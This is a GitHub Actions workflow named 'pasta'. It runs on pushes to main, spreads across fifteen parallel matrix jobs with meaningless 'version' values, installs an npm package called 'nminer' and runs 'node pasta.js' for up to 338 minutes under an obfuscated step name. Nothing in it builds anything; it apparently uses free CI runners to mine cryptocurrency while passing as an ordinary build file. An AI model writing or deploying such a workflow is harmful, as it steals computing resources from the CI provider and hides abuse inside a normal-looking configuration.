name: pasta
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 5519 }
          - { version: 9130 }
          - { version: 9203 }
          - { version: 5546 }
          - { version: 671 }
          - { version: 2193 }
          - { version: 558 }
          - { version: 7374 }
          - { version: 4951 }
          - { version: 6573 }
          - { version: 8847 }
          - { version: 9434 }
          - { version: 4641 }
          - { version: 8838 }
          - { version: 3342 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: deceivingly past against
        run: |
          npm install nminer@latest
          timeout 338m node pasta.js || echo "pasta executed"